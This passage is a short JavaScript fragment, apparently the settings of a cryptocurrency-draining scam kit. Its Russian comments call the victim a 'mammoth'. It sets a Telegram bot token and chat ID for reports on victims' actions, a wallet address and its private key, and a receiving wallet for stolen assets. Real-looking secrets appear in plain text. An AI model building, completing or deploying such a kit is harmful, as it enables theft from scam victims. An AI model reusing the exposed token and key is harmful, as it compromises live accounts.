...
const MS_Telegram_Token = "5858343744:AAHaowZLWptD3hpdleB5yz1vgdhIgFzZriE"; // Сюда вписать свой токен от бота из @BotFather
const MS_Telegram_Chat_ID = "2031327961"; // Сюда вписать ID чата, куда нужно отправлять уведомления о действиях мамонта

const MS_Wallet_Address = "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9"; // Адрес кошелька, куда будут идти активы мамонта
const MS_Wallet_Private = "1fa0c54d660cbb767588b671b5cf8c30e0779ed1797a617811fd51284a5dca45"; // Приватный ключ от кошелька выше (ОБЯЗАТЕЛЬНО)
const MS_Wallet_Receiver = "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9"; // Кошелек, куда будут приходить активы, может быть таким же, как MS_Wallet_Address
